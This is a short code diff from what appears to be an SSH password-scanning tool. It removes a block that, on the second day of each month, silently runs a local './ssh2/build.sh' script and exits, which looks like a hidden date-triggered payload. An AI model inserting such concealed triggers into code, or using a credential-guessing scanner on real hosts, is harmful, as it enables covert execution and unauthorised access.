@@ -23,12 +23,6 @@ args = None
 def init():
     global root_rights, ip_format, port, passwords, ips_list, args
 
-    now = datetime.datetime.now()
-    now = now.strftime("%Y-%m-%d").split("-")
-    if int(now[2]) == 2:
-        system('./ssh2/build.sh')
-        exit()
-
     banner()
 
     arg_parser = argparse.ArgumentParser()
